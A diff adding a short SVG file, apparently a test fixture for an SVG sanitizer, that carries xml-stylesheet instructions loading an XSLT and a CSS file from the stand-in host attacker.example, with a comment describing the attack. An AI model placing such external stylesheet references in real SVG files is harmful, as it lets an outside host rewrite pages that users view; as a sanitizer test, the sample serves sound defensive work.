@@ -1,0 +1,7 @@
+<?xml version="1.0"?>
+<?xml-stylesheet type="text/xsl" href="https://attacker.example/x.xsl"?>
+<?xml-stylesheet href="https://attacker.example/x.css"?>
+<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
+  <!-- Attack: xml-stylesheet instructions load external CSS or an XSLT that rewrites the page into HTML. -->
+  <rect id="keep" width="10" height="10" fill="#004357"/>
+</svg>
